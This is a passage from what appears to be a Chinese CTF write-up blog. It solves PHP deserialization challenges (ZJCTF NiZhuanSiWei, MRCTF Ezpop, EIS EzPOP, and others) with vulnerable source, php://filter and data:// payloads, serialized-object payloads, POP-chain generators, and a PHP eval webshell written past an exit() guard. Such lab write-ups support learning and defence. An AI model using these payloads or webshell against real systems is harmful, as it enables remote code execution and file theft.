/tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code>。</p><h2 id="网鼎杯-2020-青龙组-AreUSerialz">[网鼎杯 2020 青龙组]AreUSerialz</h2><h3 id="TODO">TODO</h3><h2 id="安洵杯-2019-easy-serialize-php">[安洵杯 2019] easy_serialize_php</h2><h3 id="考点-v3">考点</h3><ul><li>代码审计</li><li>PHP 反序列化对象逃逸</li></ul><h3 id="解题-v3">解题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据提示查看phpinfo</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703230203.png" alt=""></p><p>直接访问d0g3_f1ag.php没有回显。</p><h3 id="TODO-v2">TODO</h3><h2 id="ZJCTF2019-NiZhuanSiWei">[ZJCTF2019]NiZhuanSiWei</h2><h3 id="考点-v4">考点</h3><ul><li>代码审计</li><li>文件包含</li><li>PHP反序列化</li></ul><h3 id="解题-v4">解题</h3><p>直接给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="file-get-contents绕过">file_get_contents绕过</h4><p>有两种方式绕过：</p><ol><li>使用php://input伪协议绕过<br>① 将要GET的参数?xxx=php://input<br>② 用post方法传入想要file_get_contents()函数返回的值</li><li>用data://伪协议绕过<br>将url改为：?xxx=data://text/plain;base64，想要file_get_contents()函数返回的值的base64编码<br>或者将url改为：?xxx=data:text/plain,(url编码的内容)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure><h4 id="读取useless-php">读取useless.php</h4><p>题目有第二个参数file，大概是include()这个file，题目提示我们要包含useless.php，同时有一个判断是file参数不能传入flag，也就是我们不能直接包含flag.php。</p><p>利用php://filter协议读取这个useless.php，构造payload读取useless.php：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure><p>useless.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;HAHAHAHAHA&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="反序列化">反序列化</h4><p>useless.php的魔术方法是<code>__toString()</code>，刚好可以使用<code>echo $password</code>触发这个魔术方法。</p><p>生成payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> Flag();</span><br><span class="line">$s = serialize($o);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>综合起来的payload就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-Ezpop">[MRCTF2020]Ezpop</h2><h3 id="考点-v5">考点</h3><ul><li>POP链构造</li></ul><h3 id="解题-v5">解题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $var=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$m = <span class="keyword">new</span> Modifier();</span><br><span class="line">$t-&gt;p = $m;</span><br><span class="line">$s-&gt;source = $s;</span><br><span class="line">$s-&gt;str = $t;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($s));</span><br></pre></td></tr></table></figure><h2 id="EIS-2019-EzPOP">[EIS 2019]EzPOP</h2><h3 id="考点-v6">考点</h3><ul><li>POP链构造</li><li>php://filter 绕过exit()</li><li>base64编码规则</li></ul><h3 id="解题-v6">解题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store, $key = <span class="string">&#x27;flysystem&#x27;</span>, $expire = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params">$expire</span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> $name</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params">$data</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">$name, $value, $expire = <span class="literal">null</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure><p>题目提示的很明显，需要构造一个POP链，能利用的魔法函数只有 <code>A::__destruct()</code>，可能可以利用的敏感函数：B 类 <code>set()</code> 中的 <code>file_put_contents()</code>。先分析一下 <code>file_put_contents()</code> 函数是否满足利用条件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line">$result = file_put_contents($filename, $data);</span><br></pre></td></tr></table></figure><p>在 exit() 代码后面拼接 <code>$data</code> 数据，然后写入文件。这样就会导致我们通过<code>$data</code>写入的shll都不会被执行。</p><p>exit()函数可以利用<code>base64_decode</code>以及<code>php://filter</code>可以绕过。</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></p></blockquote><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815093758.png" alt=""></p><p>这里思路是<strong>利用 <code>php://filter</code> 提供的各种函数去除 “死亡exit”</strong>。</p><p>接下来开始寻找 POP 链</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815093927.png" alt=""></p><p>接下来回溯看<code>$filename</code>和``$data`是怎么来的：</p><p><code>$filename</code>：先调用<code>getCacheKey($name)</code>，改方法是执行连接字符串的作用：<code>$this-&gt;option['prefix'].$name</code>构成filename。</p><p><code>$data</code>：来自于<code> $this-&gt;serialize($value)</code>，所以再关注<code>$value</code>是怎么来的。<code>$value</code>是<code>A::getForStorage()</code>的返回值：<code>json_encode([A::cleanContents(A::cache), A::complete]);</code>。<br><code>A::cleanContents(A::cache)</code>实现了一个过滤的功能，<strong>A::complete更容易控制，直接写为shellcode</strong>。</p><p>其中cleanContents():</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">    $cachedProperties = array_flip([</span><br><span class="line">        <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">            $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $contents;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试本地运行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">    $cachedProperties = array_flip([</span><br><span class="line">        <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">            $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $contents;</span><br><span class="line">&#125;</span><br><span class="line">$cache=<span class="keyword">array</span>();</span><br><span class="line">$complete=<span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> json_encode([cleanContents($cache), $complete]);</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[],&quot;&lt;?php @eval($_POST[\&quot;a\&quot;]);?&gt;&quot;]</span><br></pre></td></tr></table></figure><p>可以看到直接complete写入shell会使shell中双引号被转义了，所以得考虑用base64编码绕过转义，再在之后解码。由于之后可以让<code>$this-&gt;options['serialize']=base64.decode</code>，这样和filter://就共有两处解码处理，所以对应这里考虑编码两次。</p><p>最终代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 